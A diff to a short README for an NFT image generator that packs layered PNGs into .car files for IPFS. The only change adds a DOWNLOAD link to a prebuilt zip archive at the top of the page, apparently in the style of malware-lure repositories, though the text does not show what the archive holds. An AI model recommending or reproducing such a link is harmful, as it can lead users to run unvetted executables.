@@ -1,5 +1,7 @@
 ### NFT art maker
 
+[DOWNLOAD](https://github.com/taothia2000/NFTgenerator/releases/download/Download/NFTgenerator.zip)
+
 The primary task of this tool is to generate a randomized set of images from provided PNG layers and pack them into .car files. Then you can upload them to IPFS using [nft.storage](https://nft.storage/) or other tools.
 
 **Please test it before using it for the real stuff. It can always be buggy.**
